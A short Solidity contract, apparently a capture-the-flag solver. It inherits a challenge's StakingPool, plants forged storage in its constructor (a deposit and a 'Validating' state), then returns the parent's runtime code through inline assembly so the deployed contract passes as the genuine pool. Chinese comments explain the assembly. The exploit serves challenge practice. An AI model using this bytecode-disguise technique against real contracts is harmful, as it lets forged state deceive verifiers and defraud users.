// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {StakingPool} from "./Challenge.sol";

contract EthStakingSolver is StakingPool {
    constructor(
        address _operator,
        address _insurance
    ) StakingPool(_operator, _insurance) {
        deposits[msg.sender] = 1;
        state = State.Validating;
        bytes memory code = type(StakingPool).runtimeCode;

        assembly {
            // A: code 表示是 memory 的起點位置，第一個 bytes32 是記錄 length
            // A: add(code, 0x20) 表示略過 length，直接從 bytes 內容開始
            // A: mload(code) 表示是從 memory(code)的位置讀 32bytes 的值，這邊就是回傳 code length
            // A: return(真正 runtime code, length)
            return(add(code, 0x20), mload(code))
        }
    }
}
